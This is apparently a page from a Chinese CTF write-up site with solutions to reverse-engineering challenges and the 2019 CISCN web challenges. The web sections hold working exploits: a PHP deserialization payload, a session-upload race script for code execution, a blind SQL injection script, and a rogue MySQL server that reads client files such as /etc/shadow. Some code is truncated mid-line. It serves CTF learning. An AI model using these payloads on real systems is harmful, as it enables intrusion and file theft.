print(\"+\") elif(c==\"subu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + n1 + \"-\" + n2) print(\"-\") elif(c==\"beq\"): print(\"=0x%x\"%(v0)) print(\"================================================one function=====================================\") functions +=1 continue elif(c==\"negu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + \"-\" + n2) print(\"-\") elif(c==\"nop\"): continue elif(c==\"lui\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n2 + \"方法二：优雅反编译 在某zhao师傅的提醒下想起来jeb的MIPS版本可以对汇编进行简单的反编译： 虽然数组全部是通过指针+偏移的方式来调用，不过可以全部复制下来再用正则来整理数据，将*(par00+x)替换为par00[x/4]的形式（可不要像某zhao师傅一样将参数一个个抄下来哟（不然就会像他一样把参数不慎抄错几个然后纠结若干小时XDDDDDD 上述两种方法得到方程以后就可以通过z3, numpy, matlab一类的数学工具求解方程组了，下面给出z3py的示例代码 from z3 import * a = [BitVec(\"a%d\"%i, 32) for i in range(16)] s = Solver() s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15] == 0xaa2ed7) s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15] == 0x69d32e) s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15] == 0x3b89d9) s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15] == 0xff6a5aea) s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15] == 0x953584) s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15] == 0xffd31341) s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15] == 0xff9a6b57) s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15] == 0xffd6b3d3) s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15] == 0xc6ea77) s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15] == 0xff1daae5) s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15] == 0xff5be0b4) s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15] == 0x144313b) s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15] == 0xffd18bd2) s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15] == 0xb5cb52) s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15] == 0xa6014d) s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15] == 0x2fde7c) if(s.check()==sat): c = b'' m = s.model() for i in range(16): print(\"a[%d]=%d\"%(i, m[a[i]].as_long())) for i in range(16): print(chr(m[a[i]].as_long()&0xff), end='') 方法三：符号执行 无名侠师傅提出了使用angr来全自动求解的方法，注意二进制文件也需要去过花。我这边不知道是因为capstone没有mips反编译的版本还是地址扒错了跑不出来，只好直接附上师傅的脚本。 注意其中find和avoid的值由于各人的bin文件不同，因此地址需要自行修正。 from angr import * import logging import IPython logging.getLogger('angr.manager').setLevel(logging.DEBUG) p = Project('mips2') state = p.factory.blank_state(addr=0x400420) DATA_ADDR = 0xA0000 state.regs.a0 = DATA_ADDR for i in range(16*4): vec = state.solver.BVS(\"c{}\".format(i),8,explicit_name=True) cond = state.solver.And(vec>=32,vec 黑盒破解 这个题目比较硬核，输入的地方通过比较字符串来选择函数。首先通过构造函数找到整个数据结构的定义 偏移 值 类型 长度 备注 a1 sth_p q 0x100 a1+8 char_table_0_p q 0x100 0x6030e0 a1+16 input c 100 a1+272 rand%50 a1+280 char_table_0_p-sth_p q a1+288+8 char_table_2 d 8 (a1+8)[72+l] 6030e0[l+255] a1+408 char_table_1 b 255 0x603700 a1+672 func_addr q 255 (a1+8)[84+i] 603200+i(+=) a1+672+8 func_table q 8 (a1+8)[84+6030e0[l+255]] 输入函数形式为： for i in range(len(input)): *(a1+664) = input[i+1] for j in range(8): if(f[input[i]] == (a1 + 408)[(a1+8)[72+j]]): call (a1+8)[84 + (a1+8)[j+72]] ( a1 ) 可以看到，实际上就是令Input[i]作为下标取数组f的值，然后遍历char_table_1中的8个值，如有相等的则取func_addr中对应的函数来调用。 一共8个函数，根据提示语可以定位到其中的一个函数，查看交叉引用则能找到另外8个函数的函数表： 逐个反编译发现： 函数名 执行条件 表达式 功能 func_0 (a1+288) (a1+665) = char_table[a1+288] m=c[index] func_1 (a1+288) char_table[a1+288] = (a1+665) c[index]=m func_2 … (a1+665) = (a1+665) + (a1+664) – 33 m+=[next]-33 func_3 … (a1+665) = (a1+665) – ((a1+664) – 33) + 1 m-=[next]-33 func_4 … (a1+288)++ index++ check_func *(a1+664)==’s’ s = char_table_0[(a1+288)], len=20,puts(s) check(s) func_6 … (a1+288)– index– func_7 … 后一个参 char_table_0[a1+288] = input[(a1+288) + (a1+664) – 48] – 49 其中用到的变量一共有4个： a1+292 = 255 a1+664 = [next]（即input[i+1]) a1+665 = m（临时变量） a1+288 = index 在check_func中会输出s，s是从char_table_0中以index为起点取的0x20个值。如果s满足三个方程则通过校验，返回成功。 而实际上那三个方程是不需要逆的—题目中明示了只要输出“Binggo”即可得到flag。因此目标显然是在char_table_0中获得Binggo的字符串，将其dump出来输出了一下发现并字符顺序并没有合适的，甚至上述5个字母都不齐。以及一个最关键的问题，check_func中取了0x20个值赋给s，这显然不符合”Binggo”的要求，因此第七个字符必须给上”使其截断才行。 分析其余7个函数，发现0和1可以交换char_table_0中的字符的位置，2、3和7则可以修改char_table_0中字符的值，4和6则是用来移动下标的，最后check_func加’s’来结束并输出。在构造输入之前，先要找到函数对应的输入值。 逆向一下发现char_table中还被更改了值，IDA动态调试断在函数调用处调用idc脚本,即可得到对应值： auto i, j, v14, p, q; for(i=0;i24 $ 400dc1 38 8 400e7a 43 C 400f3a 74 t 401064 * 30 0 4011c9 45 E 40133d 75 u 4012f3 * 23 # 4014b9 得到这8个输入字符即可开始构造了。 由于函数功能很多样，因此构造方法很多，在此仅表述我的构造方法： 由于输入buffer有限，因此不适合向右移动指针太多来找寻合适的字符。所以我就原地变换—毕竟将一个字符变成另一个字符满打满算也只要4个输入，移动指针可就轻而易举几十上百了。 下列计划中push表示将char_table中的值取入m，A->B表示将A通过func_2和3变换成B，->1表示指针后移1位 push P # $ P->B # t/ pop B # 8 #111(用于填充make，其实1个就够，懒得算了233) B->i # CH ->1 # 0 pop i # 8 i->n # C& ->1 # 0 pop n # 8 ->1 # 0 n->g # t( pop g # 8 ->1 # 0 pop g # 8 g->o # C) ->1 # 0 pop o # 8 ->1 # 0 make x00 # #0 其中的111是为了make x00，在指针指向第七个字符时直接构造，提交给服务器即可获得flag。相对而言我觉得这题是所有（re和安卓）题目中质量最高和最（逆向过程中）有趣的~ 被隐藏的真实 这题本来单纯地以为是很简单的题，听欧佳俊师傅讲了一下出题思路才发现他的想法真的比答题人多得多…… main函数里调用了三次get_pwd()这个函数来check输入 get_pwd中接受输入，然后对count自增，调用了Bitcoin对象的一个函数来校验输入 如果熟悉C++逆向的话，一眼就能看出来这是在调用虚函数 因为v2是对象的空间，在C++的对象构造中，开头4个字节指向的是虚函数表 v2指向的是虚函数表，*v2就是虚函数表的第一个函数了 （图片引自C++对象模型详解释https://www.cnblogs.com/tgycoder/p/5426628.html） 做题的时候不是很熟悉C++的模型，以及虚函数反编译的不是很明显，直接动态调试做的。初始状态这个虚函数是init，其中调用了verify，第一次直接返回输入，对应输出列表的需求，要输入0xdeadbeef的小端序表示”efbeadde”。如果纯静态逆向，会继续往下看verify函数的第二、三次校验，但事实上第二次就没有调用init了。 我在做的时候因为不熟悉虚函数，所以动态调试直接跟进函数，发现进入了sub_4046D7这个函数，其中的核心函数b58e乍看起来很复杂，但其实通过其中的24（实际上是256）、%58，和题目内的信息描述很容易想到比特币地址转换方法–base58 直接进行解密获得bytes类型即可通关（注意最后4字节是sha256的验算字节，不可提交，否则会导致flag的sha256计算错误。因为第二关仅截取19个字符送入，但跟flag有关的sha256却会把所有input全部进行运算，导致最后提示Correct实际上的flag却不对） 话是这么说，直接套来的脚本解密出来其实没看懂，还是自己查资料从加密到解密走了一趟才get到应该是hex格式。第三小关本来以为是脑洞题了，其实是误打误撞做出来的，运气是真的好OTZ 这次虚函数又回到了verify，将Input进行两次sha256然后逆序与结果比较，当时的想法是结合提示语： 查了一下发现这条地址是中本聪在开始比特币时记录的第一个块–创世块，刚开始想到的是根据创世块向区块链后端爆破，某个区块的sha将会满足要求。不过查了一下好像也没什么适合计算的，总不能自己重复一遍挖矿过程吧233 卡了许久，代码中突然发现一个关键点 长度80是个很关键的提示！ 于是去找了区块链结构解析，发现区块头的长度正好是80个字节 https://webbtc.com/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f.hex 在这里得到了创世块的头部信息，提交即可获得flag 事实上在经过家俊师傅的讲解后，再回头逆才发现这里的memcmp被覆盖到了sub_404A36函数 这个函数中通过异或生成了一个串，然后将输入的字符串与做过两次sha256再逆序的输入进行memcmp。这个两次sha256再逆序的操作，在之前的查资料过程中发现就是比特币的哈希方法，把异或生成的串dump出来去搜索。 IDC>auto i;for(i=0;i发现是创世块的哈希值，由此倒推出原输入是创世块。 比赛的时候从一个长度猜到创世块头部，不得不感叹自己的运气真的是…… 最后再分析一下虚函数的覆盖，和家俊师傅挖下的种种坑 首先注意到虚函数表中的第一个函数在初始情况下是Init 逐步跟踪，发现Bitcoin在构造函数中就有玄机 这里跳转到了0x6D0F88处，过去看看 这时是直接一个leave和retn返回了 但是后面有很多不可识别的脏数据，暂且先放着不管，继续往后走 get_pwd函数中就如之前分析的一样，没什么问题 问题在于析构函数里 乍一看好像没什么问题哦，delete释放空间嘛 注意这里的(this+3)指向的就是刚才跳转的0x6D0F88 再点进delete内一看 ？！ 跟正常调用free的delete完全不一样，左边function列表中也竟然出现了两个同名的函数 另外一个才是调用free的原delete，这个是冒牌的！ 这里利用的是IDA的重命名机制–C++编译器为了区分重载函数，会对函数生成一些其他字符来修饰。delete函数被修饰以后的名称是”_ZdaPv”，但是冒牌delete函数的原名是”__ZdaPv”，IDA同样也会将其重命名为delete，导致被忽视。 这个delete中将参数指向的空间写为0x90，即NOP的机器码 因此可以将刚才的leave、retn和大量脏数据全部写成NOP，从而使下一次调用构造函数的时候可以执行一些其他代码，而这个机密的函数就是脏数据之后的代码，sub_6D1048 这里的a1是rbp，频繁调用的a1-8就是this指针 可以看到，每次调用都会覆盖一次虚函数 另外当第三次执行的时候会将memcmp重写 整个理透以后这个题目学到的应该是最多的，各种阴险技术，真的很有意思23333 可惜做的时候动态跟过去会忽视掉这里的大量重写，比较可惜 探寻逝去的Atlantis文明 打开文件发现啥都没有 运行杀毒软件提示有代码混淆器 OD挂上各种报错，估计有反调 于是从头分析，首先是两个TlsCallback TlsCallback_0中第一个函数sub_402B30动态获取了ZwSetInformationThread设置当前线程的信息 v0 = GetModuleHandleA(&ModuleName); // Ntdll v1 = GetProcAddress(v0, &ProcName); // ZwSetInformationThread v2 = GetCurrentThread(); return ((int (__stdcall *)(HANDLE, signed int, _DWORD, _DWORD))v1)(v2, 17, 0, 0);// ThreadHideFromDebugger 百度一下可以轻松发现这个函数经常被用来反调试，第17个参数正好就是反调用的： 将其首字节改成0xc3，爆破掉即可 后一个函数sub_4028F0同样也是动态获取了4个函数的地址，将它们保存在了一个函数表中留待日后取用。其中一个是IsDebuggerPresent这样的反调函数，另外三个则是VirtualAlloc、VirtualFree和Exit这种有用的函数，因此不可简单Patch 再往后立即就调用了刚才的IsDebuggerPresent，判断到直接Exit 这里Patch或者下断过都行，小问题 TlsCallback_1里则是一个MessageBox，无关紧要 接着进入main主函数 那三个连续的函数不用在意，解密代码很复杂，无需关心 sub_43180里是对Debug断点的Hook 我们知道调试器下断的原理是将某个地址的机器码改为0xcc，使其触发异常，从而被调试器捕捉中断 这个Hook会将0xcc改为0xc3，直接ret，导致不仅调试器捕捉不到断点，而且会直接令程序崩溃 这个函数里除了Hook没有别的东西，直接Patch掉 sub_403010里才是重头戏，通过memcpy将解密后的代码送入开辟出的空间中，然后直接调用 几个函数通过F8步过函数可以大致猜测出功能 关键在change_input和check两个函数中 其实当把那几个反调试通过以后就问题就不大了 动态调试跟进去，发现change_input中将Inputbase64后通过GlobalAddAtom将其加入了全局原子 再往后跟的几个函数都格外的复杂，再加上代码是动态解密的，每次都需要自己MakeCode再F5才能浏览一遍猜测是否需要详细跟踪 事实上在AddAtom之后虽然还有几个函数调用了Input的指针，但它们都是释放空间用的。 这个AddAtom添加了一个全局可用的字符串，必然在某处调用了GlobalGetAtomName 因此不妨稍微忽视一下其他函数，再往后跟 果不其然在v19，即check中捕捉到了GlobalGetAtomName的调用 该函数中生成了一个table，然后将table进行一顿操作后与Input逐字节异或，最后与另一个值进行比较—非常简单粗暴常见的逆向套路了 可以通过dump将table得到，然后效仿操作与结果数组异或从而得到flag 但更简单的方法当然是注意到这两点： 异或的逆运算还是异或 将table进行一顿操作与input完全无关 因此将结果数组直接放入Input的地址中，等到比较的时候，该地址中就是我们需要input的值了 解base64轻松得到flag。 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-20 21:56:18 0 issues reported "},"articals/2019national.html":{"url":"articals/2019national.html","title":"2019全国信安赛","keywords":"","body":"2019全国大学生信息安全大赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/1Oz3GjZ7oSdjiFHbz29huMA 提取码: x81y 网上公开WP: https://xz.aliyun.com/t/4906 https://xz.aliyun.com/t/4904 https://xz.aliyun.com/t/4982 https://www.zhaoj.in/read-5417.html https://www.52pojie.cn/thread-936377-1-1.html http://12end.xyz/essay1/ https://impakho.com/post/ciscn-2019-online-writeup https://www.anquanke.com/post/id/177039 本站备份WP： 感谢作者：Glzjin、wu1a、warden、lizhirui、12end、七月火、Pinging Web 作者：Glzjin、七月火 JustSoso 解法一 题目 知识点：任意文件读取，PHP 反序列化 步骤： 1、打开靶机，发现是这样一个页面。 2、来看看源码。给了参数和提示，让获取 hint.php 的源码。 3、那么就来获取源码看看吧，访问 /?file=php://filter/read=convert.base64-encode/resource=hint.php 4、BASE64 解码一下，得到 hint.php 的源码。 $v) { $this->$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this->handle = $handle; } public function __destruct(){ $this->handle->getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this->file = $file; $this->token_flag = $this->token = md5(rand(1,10000)); } public function getFlag(){ $this->token_flag = md5(rand(1,10000)); if($this->token === $this->token_flag) { if(isset($this->file)){ echo @highlight_file($this->file,true); } } } } ?> 5、重复上面的 3~4 步，获取 index.php 的源码。 '; } if(preg_match(\"/flag/\",$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo \"Missing parameters\"; } ?> 6、来审计一下源码。 index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的文件，再经过一系列的检测之后 反序列化 payload。 然后 hint.php 有两个类 Handle 和 Flag。 对于 Handle 类，它的魔术方法 Weakup 会清空其自身的成员变量，将其都置为 null。而其析构函数则会调用自身成员变量 handle 的 getFlag 方法。而 Flag 类就有这个 getFlag 方法了，其中会随机一个 md5(1~10000随机数) 的 flag_token，和自身的 token 做比较，相等就去读文件。看起来我们可以用这里来读 flag.php 文件了。 7、把源码拷到本地，来伪造序列化对象。 $v) { $this->$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this->handle = $handle; } public function __destruct(){ $this->handle->getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this->file = $file; $this->token_flag = $this->token = md5(rand(1,10000)); $this->token = &$this->token_flag; } public function getFlag(){ $this->token_flag = md5(rand(1,10000)); if($this->token === $this->token_flag) { if(isset($this->file)){ echo @highlight_file($this->file,true); } } } } $flag = new Flag(\"flag.php\"); $handle = new Handle($flag); echo serialize($handle).\"\\n\"; ?> 这里我们加了一行： $this->token = &$this->token_flag; 这样做主要是为了下面 getFlag 那的比较，因为这样的引用变量和他所指向的变量一比较，当然相等了。 后面三行就是要求去读 flag.php 文件，然后序列化对象了。 8、运行一下，生成。 9、打上去，注意 Handle 里的 handle 是私有成员变量，所以得特殊处理下，里面的方块那记得换成 %00。还有为了不触发 weak up[1]，所以我们得改下 payload,把成员数目改大些。同时为了绕过后面对于 payload 的检测，我们还要再前面加几个 /[2]。所以这里就是访问 ///?file=hint.php&payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;s:32:”b77375f945f272a2084c0119c871c13c”;s:10:”token_flag”;R:4;}} 参考资料[1]:https://www.jianshu.com/p/67ef6f662a4d 参考资料[2]:http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html 10、访问一下。 11、Flag 到手~ Flag: flag{d3601d22-3d10-440e-84b5-c9faff815551} 解法二 作者：12end 包含session文件以RCE这道题默认没有session，我们可以通过伪造固定session,post一个空文件以及恶意的PHP_SESSION_UPLOAD_PROGRES来执行构造的任意代码。 PHP_SESSION_UPLOAD_PROGRES是一个常量，他是php.ini设置中session.upload_progress.name的默认值，session.upload_progress是PHP5.4的新特征。下面是我本地php5.4的默认配置： 讲一下个别配置的含义： session.upload_progress.cleanup 是否在上传结束清除上传进度信息，默认为on session.upload_progress.enabled 是否开启记录上传进度信息，默认为on session.uploadprogress.prefix 存储上传进度信息的变量前缀，默认为upload_progress session.upload_progress.name POST中代表进度信息的常量名称，默认为PHP_SESSION_UPLOAD_PROGRES如果 _POST[session.upload_progress.name]没有被设置, 则不会报告进度 可以看到，session.upload_progress.cleanup默认是开启的，这意味着我们上传文件后，进度信息会被删除，我们也就不能直接包含session文件，这就需要利用条件竞争，趁进度信息还未被删除时包含session文件。 条件竞争 一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计不合理时，将会导致一系列问题的发生。 我们写一个脚本，一个线程不断上传空文件（同时post伪造的恶意进度信息），另一些线程不停地访问session临时文件，总有几次我们会在服务端还没有删除进度信息时访问到session临时文件。 python脚本： import requests import threading url='http://127.0.0.1/index.php' r=requests.session() headers={ \"Cookie\":'PHPSESSID=123' } def POST(): while True: file={ \"upload\":('','') #上传无效的空文件 } data={ \"PHP_SESSION_UPLOAD_PROGRESS\":'' #恶意进度信息，readfile将直接输出文件内容 } r.post(url,files=file,headers=headers,data=data) def READ(): while True: event.wait() t=r.get(\"http://127.0.0.1/index.php?file=../tmp/tmp/sess_123\") if 'flag' not in t.text: print('[+]retry') else: print(t.text) event.clear() event=threading.Event() event.set() threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() RCE拿到flag内容：因为比赛是下发的docker容器，写shell意义不大，但是的确通过这个脚本读到了flag。这个方法依赖于php.ini的一些配置选项，以及session目录的信息，不过大多数情况下这些都是默认的，很容易可以猜到 还有更多利用方法，各位师傅们自由发挥。 全宇宙最简单的SQL 题目 知识点：布尔型盲注，Waf Bypass，MySQL 客户端任意文件读取 1、打开靶机。 2、然后测试提交，抓包看看。 3、放到 postman 里试试。 4、不断 fuzz。主要观察到以下几个现象。 username 有注入点。 过滤了 or。 当最终拼接语句无错误时无论结果如何均为 登录失败。 当最终语句有错时返回为 数据库操作失败。 5、根据这两个返回，就可以判断其为 布尔型盲注 了。 6、综上，测试 payload 如下。 username = admin’ union select cot(1 and left(database(),1)>’a’);# 当 left(database(),1)>’a’) 也就是条件为真时，1 and left(database(),1)>’a’ 整个表达式大于 0，没有错误爆出。 当条件为假时，1 and left(database(),1)>’a’ 等于 0，有错误爆出。 上面所说有语句正确执行与否时返回不同，就可以这样区分了。 7、从这儿 http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/ 找了个小脚本，把我们的 payload 放进去，修改一下返回判断条件。 同时注意 or 被过滤了，所以 information_schema 也传不上去了。这里就得自己猜猜表名了。 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import requests def main(): get_all_databases(\"http://39.97.167.120:52105/\") def http_get(url, payload): result = requests.post(url, data={'username': 'admin' + payload, 'password': '123456'}) result.encoding = 'utf-8' if result.text.find('数据库操作失败') == -1: return True else: return False # 获取数据库 def get_all_databases(url): db_nums_payload = \"select count(*) from users\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) # 二分法函数 def half(url, payload): low = 0 high = 126 # print(standard_html) while low %d);#\" % (payload, mid) # print(mid_num_payload) # print(mid_html) if http_get(url, mid_num_payload): low = mid + 1 else: high = mid - 1 mid_num = int((low + high + 1) / 2) return mid_num if __name__ == '__main__': main() 8、不断 fuzz，当 长度不为 0 时就是找到表了。 0，没找到或没数据 1，找到了 9、找到表名为 user，知道表名，不知道列名，那就改下函数，如下面这样整，给表设别名。 # 获取数据库 def get_all_databases(url): db_nums_payload = \"select length(group_concat(a.1)) from (select 1, 2 union select * from user)a\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) db_payload = \"select group_concat(a.1) from (select 1, 2 union select * from user)a\" db_name = \"\" for y in range(1, db_numbers + 1): db_name_payload = \"ascii(substr((\" + db_payload + \"),%d,1))\" % ( y) db_name += chr(half(url, db_name_payload)) print(\"值：\" + db_name) 第一列是用户名。 参看资料：http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D 10、再来第二列试试。 # 获取数据库 def get_all_databases(url): db_nums_payload = \"select length(group_concat(a.2)) from (select 1, 2 union select * from user)a\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) db_payload = \"select group_concat(a.2) from (select 1, 2 union select * from user)a\" db_name = \"\" for y in range(1, db_numbers + 1): db_name_payload = \"ascii(substr((\" + db_payload + \"),%d,1))\" % ( y) db_name += chr(half(url, db_name_payload)) print(\"值：\" + db_name) 第二列就是密码了。 似乎还提示我们 flag 在 /fll1llag_h3r3。 11、先用这组用户名密码登录看看，看到可以登录成功。 12、很熟悉的页面，祭出我们的祖传恶意 MySQL 服务器吧。改好要读取的文件，在自己的服务器上运行。 #!/usr/bin/env python #coding: utf8 import socket import asyncore import asynchat import struct import random import logging import logging.handlers PORT = 3306 log = logging.getLogger(__name__) log.setLevel(logging.DEBUG) # tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab') tmp_format = logging.StreamHandler() tmp_format.setFormatter(logging.Formatter(\"%(asctime)s:%(levelname)s:%(message)s\")) log.addHandler( tmp_format ) filelist = ( # r'c:\\boot.ini', # r'c:\\windows\\win.ini', # r'c:\\windows\\system32\\drivers\\etc\\hosts', '/fll1llag_h3r3', # '/etc/shadow', ) #================================================ #=======No need to change after this lines======= #================================================ __author__ = 'Gifts' def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null) class LastPacket(Exception): pass class OutOfOrder(Exception): pass class mysql_packet(object): packet_header = struct.Struct('> 16, 0, self.packet_num) result = \"{0}{1}\".format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload) class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, \"\".join(( '\\x0a', # Protocol '5.6.28-0ubuntu0.14.04.1' + '\\0', '\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00', )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = \"\".join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes 13、在页面上填好信息，点提交。 